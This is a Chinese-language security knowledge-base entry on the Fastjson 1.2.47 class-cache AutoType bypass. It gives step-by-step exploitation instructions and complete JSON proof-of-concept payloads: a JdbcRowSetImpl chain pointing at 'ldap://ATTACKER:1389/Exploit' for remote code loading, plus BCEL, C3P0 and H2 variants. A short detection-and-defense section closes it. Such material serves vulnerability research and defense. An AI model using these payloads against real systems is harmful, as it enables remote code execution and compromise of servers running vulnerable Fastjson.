---
id: web-java-deser-fastjson-1247-class-cache-bypass
title: Fastjson 1.2.47 类缓存绕过 AutoType：java.lang.Class 预置 JdbcRowSetImpl/BCEL/C3P0
type: scenario
domain: web
path: web/java/deserialization/fastjson
technique: fastjson-1247-class-cache-bypass
aliases:
- fastjson 1.2.47 绕过
- fastjson Class 缓存绕过
- TypeUtils.mappings 缓存
- java.lang.Class val 绕过
- fastjson 1.2.47 JdbcRowSetImpl
- fastjson 1.2.47 BCEL
tags:
- java
- fastjson
- deserialization
- autotype
- class-cache
- jndi
- bcel
- c3p0
- h2
cve: []
severity: critical
confidence: high
status: draft
created: '2026-11-04'
updated: '2026-11-04'
affected_versions: fastjson <= 1.2.47（1.2.48 起 MiscCodec 对 java.lang.Class 改为 cache=false）
---

## 一句话结论

Fastjson 1.2.47 中 `java.lang.Class` 类型的 `val` 会经由 `MiscCodec` 调用 `TypeUtils.loadClass` 并把类写入全局 `mappings` 缓存；`checkAutoType` 在黑白名单检查之前先查这个缓存，于是先在同一个 JSON 里缓存 `JdbcRowSetImpl` 等危险类，第二个对象再引用它时就能在 AutoType 关闭的情况下加载并触发。

## 原理

1.2.47 的 `MiscCodec.deserialize` 处理 `clazz == Class.class` 时执行 `TypeUtils.loadClass(strVal, classLoader)`。该重载默认 `cache=true`，会把 `className -> clazz` 放入 `TypeUtils.mappings`。

`ParserConfig.checkAutoType` 的顺序是：

```text
clazz = TypeUtils.getClassFromMapping(typeName);   // 先查缓存
if (clazz == null) { ... 黑白名单/AutoType 检查 ... }
```

因此只要目标类曾进入 `mappings`，后续 `@type` 引用它就绕过了 AutoType 校验。1.2.47 的 JSON 可以在一个请求里完成两步：第一个对象的 `@type` 是 `java.lang.Class`，`val` 是危险类名；第二个对象的 `@type` 直接写该危险类名。

## 触发条件

- fastjson 版本 <= 1.2.47，且未开启 SafeMode；
- 应用把不可信 JSON 交给 `JSON.parse`/`parseObject`；
- 目标 classpath 中存在可利用类（JDK 自带 `com.sun.rowset.JdbcRowSetImpl`，或 dbcp/C3P0/MyBatis/H2 等依赖）；
- 第一次 `java.lang.Class` 缓存与第二次引用在同一次解析或同一 JVM 内完成；
- 若走 JNDI/远程加载，需要目标能访问攻击者的 LDAP/RMI/HTTP 服务。

## 利用步骤

1. 探测 fastjson 版本与 `@type` 行为，确认处于 1.2.47 及以下；
2. 在同一 JSON 中先用 `{"@type":"java.lang.Class","val":"<危险类>"}` 把类写入缓存；
3. 第二个对象用 `@type` 引用该危险类，并设置触发属性；
4. `JdbcRowSetImpl` 设置 `dataSourceName` 为 JNDI URL、`autoCommit=true`，在 `setAutoCommit` 时发起 JNDI 查询；
5. 无 JNDI 条件时改用 BCEL、C3P0、H2 等本地/远程字节码链；
6. 观察目标对 LDAP/RMI/HTTP 的请求或命令副作用。

## PoC

```json
{
  "x1": {
    "@type": "java.lang.Class",
    "val": "com.sun.rowset.JdbcRowSetImpl"
  },
  "x2": {
    "@type": "com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName": "ldap://ATTACKER:1389/Exploit",
    "autoCommit": true
  }
}
```

BCEL 变体（JDK <= 8u251，且存在 dbcp；`driverClassName` 为 `$$BCEL$$...`）：

```json
{
  "x1": {"@type": "java.lang.Class", "val": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource"},
  "x2": {
    "name": {"@type": "java.lang.Class", "val": "com.sun.org.apache.bcel.internal.util.ClassLoader"},
    "x3": {
      "@type": "com.alibaba.fastjson.JSONObject",
      "c": {
        "@type": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource",
        "driverClassLoader": {"@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"},
        "driverClassName": "$$BCEL$$<encoded>",
        "$ref": "$.x1.x2.x3.connection"
      }
    }
  }
}
```

C3P0 变体（`userOverridesAsString` 为 `HexAsciiSerializedMap:<hex>;`）：

```json
{
  "x1": {"@type": "java.lang.Class", "val": "com.mchange.v2.c3p0.WrapperConnectionPoolDataSource"},
  "x2": {
    "@type": "com.mchange.v2.c3p0.WrapperConnectionPoolDataSource",
    "userOverridesAsString": "HexAsciiSerializedMap:<hex>;"
  }
}
```

H2 变体（h2 <= 2.2.224）：用 `org.h2.jdbcx.JdbcDataSource` 的 `url` 设置 `INIT=CREATE ALIAS ...` 执行 Java 代码，再用 `$ref` 触发 `connection`。

## 变体与关联

- BCEL 依赖差异：`org.apache.tomcat.dbcp.dbcp.BasicDataSource`（tomcat-dbcp <= 7.0.109）、`dcp2.BasicDataSource`（8.0.0-RC1 ~ 10.1.0-M2）、`org.apache.commons.dbcp.BasicDataSource`（<=1.4）、`commons-dbcp2.BasicDataSource`（<=2.13.0）。
- MyBatis：`org.apache.ibatis.datasource.unpooled.UnpooledDataSource` + BCEL ClassLoader 的 `driver` 字段。
- C3P0：`WrapperConnectionPoolDataSource.userOverridesAsString` 的反序列化。
- H2：`JdbcDataSource.url` 的 `INIT` 别名执行。
- 关联：[[web-java-deser-fastjson-jdbc-rowset]]（新版 JdbcRowSetImpl 链）；1.2.68 的 AutoCloseable 期望类绕过、1.2.80 的 Exception 缓存绕过是后续版本的替代路线。

## 检测与防御

- 检测：请求体同时出现 `"@type":"java.lang.Class"` 与 `val` 为危险类名；出现 `"@type":"com.sun.rowset.JdbcRowSetImpl"`、`$$BCEL$$`、`HexAsciiSerializedMap`、`org.h2.jdbcx.JdbcDataSource` 等特征；目标对外发起 LDAP/RMI 连接或加载远程字节码。
- 防御：升级 fastjson 到 1.2.48 以上（MiscCodec 对 `java.lang.Class` 改为 `cache=false`），并继续升级到最新；开启 SafeMode；关闭 AutoType；对 `@type` 使用 accept 白名单；禁止不必要的 JNDI/LDAP 出网。
- 注意：仅升级到 1.2.47 之后并不等于安全，后续版本仍有 1.2.68/1.2.80/1.2.83 等绕过，需要按版本逐项核查。
